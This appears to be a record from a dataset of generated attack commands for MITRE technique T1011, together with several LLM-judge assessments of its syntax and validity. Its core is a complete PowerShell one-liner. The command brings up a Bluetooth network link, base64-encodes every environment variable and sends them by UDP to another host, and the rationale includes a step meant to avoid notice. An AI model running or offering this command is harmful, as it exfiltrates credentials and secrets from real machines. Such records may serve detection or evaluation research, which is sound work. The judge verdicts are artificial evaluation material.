command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 172.31.200.2 255.255.255.252 | Out-Null; $msg=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env: | Out-String))); $u=New-Object Net.Sockets.UdpClient; $u.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.31.200.2'),0)); $dat=[Text.Encoding]::UTF8.GetBytes($msg); $u.Send($dat,$dat.Length,'172.31.200.1',53209) | Out-Null; $u.Close()
explanation: Sends base64-encoded environment data via UDP over a Bluetooth-only subnet, ensuring all traffic uses the alternate Bluetooth medium (T1011).
rationale_steps: Connect to Bluetooth NAP to establish the alternate network medium.
Set a restricted IP on the Bluetooth adapter via netsh.
Bind UDP socket to the Bluetooth IP to force medium use.
Transmit to a high, uncommon UDP port to minimize attention.

llm_judgments.syntactic_justification: PowerShell is well-formed with balanced quotes/semicolons, valid operators, and parseable expressions.
llm_judgments.semantic_justification: It attempts exfil via Bluetooth PAN using UDP, but this is not a physical removable medium per T1011 and likely fails operationally without admin rights for netsh and a tool that actually supports the specified Bluetooth NAP connect semantics.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignment, pipeline operations, and method calls.
llm_judgments.semantic_justification: The command fully implements the T1011 technique by establishing a Bluetooth PAN connection, configuring a dedicated IP subnet, encoding environment variables, and exfiltrating data over the physical Bluetooth medium.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, correct command separators, and valid PowerShell and external command syntax throughout.
llm_judgments.semantic_justification: While the command's logic and chosen tools (Bluetooth setup, IP configuration, UDP exfiltration of base64 data) are appropriate for T1011, the stated 'Privilege: None' directly conflicts with the requirement for `netsh interface ip set address` to configure the network adapter, making the core claim of 'ensuring all traffic uses the alternate Bluetooth medium' operationally unachievable.
